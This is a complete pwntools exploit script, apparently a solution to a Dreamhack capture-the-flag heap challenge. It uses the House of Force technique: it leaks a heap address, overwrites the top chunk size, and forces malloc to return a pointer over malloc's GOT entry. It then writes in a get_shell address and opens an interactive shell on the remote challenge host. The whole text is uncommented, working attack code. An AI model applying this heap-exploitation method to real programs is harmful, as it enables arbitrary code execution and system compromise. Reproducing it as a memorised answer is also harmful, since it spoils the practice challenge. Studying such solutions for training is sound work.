#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./house_of_force',checksec=False)

#p = process()
p = remote('host3.dreamhack.games', 15584)

#gdb.attach(p,gdbscript='''
 #          b*0x08048864
 #          b*0x0804872c
 #          b*0x08048775
  #         ''')
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'16')
p.sendlineafter(b'Data: ',b'a'*16)

leak_heap = p.recvuntil(b':')[:-1]
print(leak_heap)


top_chunk = int(leak_heap,16) + 20

log.info(f"top chunk: {hex(top_chunk)}")

#overwrite top chunk


input()
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'ptr idx: ',b'0')
p.sendlineafter(b'write idx: ',b'5')
p.sendlineafter(b'value: ',str(int(0xffffffff)))

target = exe.got.malloc
pause()
win = target - top_chunk - 8
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',str(int(win)))
p.sendlineafter(b'Data: ',b'a'*win)

input()
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ", b"4")
p.sendlineafter(b"Data: ", p32(exe.sym.get_shell))


p.sendlineafter("> ", '1')
p.sendlineafter("Size: ", str(0x10))
p.interactive()
